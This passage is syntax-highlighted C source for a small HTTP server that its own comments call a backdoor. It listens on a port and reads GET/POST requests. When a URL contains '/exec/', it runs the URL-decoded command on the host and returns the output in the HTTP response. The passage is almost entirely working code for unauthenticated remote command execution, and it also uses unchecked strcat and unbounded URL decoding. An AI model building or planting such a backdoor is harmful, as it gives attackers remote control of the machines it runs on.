<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">The number of command line arguments is -&gt; %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argc</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;The command line argument is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

<span class="w">    </span><span class="c1">// Check to see if a port number was passed in and exit if not</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Port number not specified, exiting...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Convert the port number from a string to an integer</span>
<span class="w">    </span><span class="n">server_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Create the socket; fail if it can&#39;t be created</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sockfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error creating socket&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Set the socket options to allow the port to be reused</span>
<span class="w">    </span><span class="c1">// fail if not successful to set options</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_REUSEADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error setting socket options&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Setup the main structure </span>
<span class="w">    </span><span class="c1">// Set the address family to AF_INET (IPv4)</span>
<span class="w">    </span><span class="n">host_addr</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// Set the port number to the port passed in.  Use htons() to convert.</span>
<span class="w">    </span><span class="n">host_addr</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">server_port</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// Set the IP address to INADDR_ANY (any IP address on the machine).</span>
<span class="w">    </span><span class="n">host_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">INADDR_ANY</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// Zero out the rest of the struct</span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">host_addr</span><span class="p">.</span><span class="n">sin_zero</span><span class="p">),</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Bind the socket to the port passed in</span>
<span class="w">    </span><span class="c1">// Fail if not successful</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">host_addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error binding to socket&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Listen on the socket for connections</span>
<span class="w">    </span><span class="c1">// Fail if not successful</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">NUM_CONNECTIONS</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error listening on socket&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Main loop</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Get size of the main structure</span>
<span class="w">        </span><span class="n">sin_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Accept a connection</span>
<span class="w">        </span><span class="c1">// Fail if not successful</span>
<span class="w">        </span><span class="n">new_sockfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">new_sockfd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error accepting connection&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1">// Print a message to the console to show a connection was accepted</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connection Accepted...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Receive the GET request from the client</span>
<span class="w">        </span><span class="c1">// a -1 from the recv function indicates an error</span>
<span class="w">        </span><span class="c1">// fail if not successful</span>
<span class="w">        </span><span class="n">recv_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">recv</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">BUFFER_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">recv_length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error receiving message&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1">// Terminate the GET request string with a null character</span>
<span class="w">        </span><span class="n">buffer</span><span class="p">[</span><span class="n">recv_length</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// Print the GET request to the console for debug</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;RECV: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Get the URL from the GET request</span>
<span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_URL_from_header</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Decode the URL</span>
<span class="w">        </span><span class="n">decoded_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URL_decode</span><span class="p">(</span><span class="n">URL</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Check to see if the URL is a backdoor command</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">does_URL_contain_slash_exec</span><span class="p">(</span><span class="n">decoded_URL</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Get the command from the decoded URL</span>
<span class="w">            </span><span class="n">backdoor_command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_CMD_from_decoded_URL</span><span class="p">(</span><span class="n">decoded_URL</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// Execute the command</span>
<span class="w">            </span><span class="n">command_output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">execute_command_return_output</span><span class="p">(</span><span class="n">backdoor_command</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// Send the 200 response to the client</span>
<span class="w">            </span><span class="c1">//send_status = send_response(new_sockfd, http200_response);</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">command_output</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">strcat</span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="n">command_output</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="c1">// Send a line break in html for debug</span>
<span class="w">            </span><span class="c1">//send_status = send_response(new_sockfd, &quot;&lt;/br&gt;&quot;);</span>
<span class="w">            </span><span class="n">send_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">send_response</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">http200_response</span><span class="p">);</span>
<span class="w">            </span>
<span class="w">            </span><span class="c1">// Free the memory used by the command output and reset the http200_response</span>
<span class="w">            </span><span class="n">strcpy</span><span class="w"> </span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="n">http200_response_no_length</span><span class="p">);</span>
<span class="w">            </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="n">CR_plus_NL</span><span class="p">);</span><span class="w"> </span>
<span class="w">            </span><span class="n">free</span><span class="p">(</span><span class="n">command_output</span><span class="p">);</span>
<span class="w">        </span>
<span class="w">        </span><span class="c1">// Handle the case where the request is invalid</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="w"> </span><span class="p">(</span><span class="n">decoded_URL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;INVALID&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>
<span class="w">            </span><span class="c1">// Send the 400 response to the client</span>
<span class="w">            </span><span class="n">send_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">send_response</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">http400_response</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Handle the case where the request is not a backdoor command</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">does_URL_contain_slash_exec</span><span class="p">(</span><span class="n">decoded_URL</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Send the 404 response to the client</span>
<span class="w">            </span><span class="n">send_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">send_response</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">http404_response</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1">// Lines below for debug</span>
<span class="w">        </span><span class="c1">// Use below for manual sending of data</span>
<span class="w">        </span><span class="c1">//send_status = send(new_sockfd, message, sizeof(message), 0);</span>
<span class="w">        </span><span class="c1">//if (send_status == -1)</span>
<span class="w">        </span><span class="c1">//{</span>
<span class="w">        </span><span class="c1">//    perror(&quot;Error sending message&quot;);</span>
<span class="w">        </span><span class="c1">//    exit(1);</span>
<span class="w">        </span><span class="c1">//}</span>

<span class="w">        </span><span class="n">close</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">send_response</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="c1">// Hold the number of bytes sent</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">bytes_sent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the length of the response</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">   </span><span class="c1">//char * error_response = &quot;Error executing command...\n&quot;;</span>
<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">error_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">error_response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Check to see if the response is empty</span>
<span class="w">    </span><span class="c1">// send an error response if it is</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">//error_response_length = strlen(error_response);</span>
<span class="w">        </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">bytes_sent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">response_length</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Get the length of a successfully executed response</span>
<span class="w">        </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
<span class="w">        </span><span class="n">bytes_sent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">response_length</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Check to see if the response was sent successfully</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bytes_sent</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">){</span>
<span class="w">            </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Error sending response&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Return the number of bytes sent</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">bytes_sent</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// This function returns the URL from the GET request</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">get_URL_from_header</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">buffer_in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="c1">// Get the method of the response</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtok</span><span class="p">(</span><span class="n">buffer_in</span><span class="p">,</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Check to see if the method is a &quot;GET&quot; or &quot;POST&quot;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">strcmp</span><span class="p">(</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;GET&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;POST&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// If the method is not a GET or POST, return invalid</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;INVALID&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// This function decodes the URL encoded string and return the decoded string</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">URL_decode</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL_in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// The length of the URL</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">URL_in</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Allocate memory for the decoded URL</span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">decoded_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// The URL encoded token</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">hex</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>

<span class="w">    </span><span class="c1">// Terminate the string</span>
<span class="w">    </span><span class="n">hex</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Counter variables</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Loop through the URL and decode the tokens</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Find the % character</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">URL_in</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;%&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">            </span><span class="c1">// Copy the next two characters after the % into the hex array</span>
<span class="w">            </span><span class="n">memcpy</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="n">URL_in</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// Convert the hex array to an integer and then a character and store in the decoded_url array</span>
<span class="w">            </span><span class="c1">// at position zero</span>
<span class="w">            </span><span class="n">decoded_url</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">strtol</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// Advance the counter by two</span>
<span class="w">            </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>

<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// If the character is not a % then just copy it to the decoded_url array</span>
<span class="w">            </span><span class="n">decoded_url</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URL_in</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// Add the null character to the end of the decoded_url array</span>
<span class="w">    </span><span class="n">decoded_url</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Decoded URL: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">decoded_url</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">decoded_url</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// This function checks to see if the URL contains the string &quot;/exec/&quot;</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">does_URL_contain_slash_exec</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL_in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Target string to search for</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/exec/&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">strstr</span><span class="p">(</span><span class="n">URL_in</span><span class="p">,</span><span class="w"> </span><span class="n">exec</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">((</span><span class="n">strlen</span><span class="p">(</span><span class="n">URL_in</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">exec</span><span class="p">))))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Search for the target string in the URL</span>
<span class="w">    </span><span class="c1">// Return 1 if found, 0 if not found</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">URL_in</span><span class="p">,</span><span class="w"> </span><span class="n">exec</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// This function gets the command from the decoded URL</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">get_CMD_from_decoded_URL</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL_in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// This function gets the command from the decoded URL</span>
<span class="w">    </span><span class="c1">// The command is the string after the /exec/ in the URL</span>

<span class="w">    </span><span class="c1">// The command to be returned from this function</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// The location of the last character of &quot;/exec/&quot;&quot; in the URL</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">exec_location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">URL_in</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/exec/&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Fail if the exec_location is NULL</span>
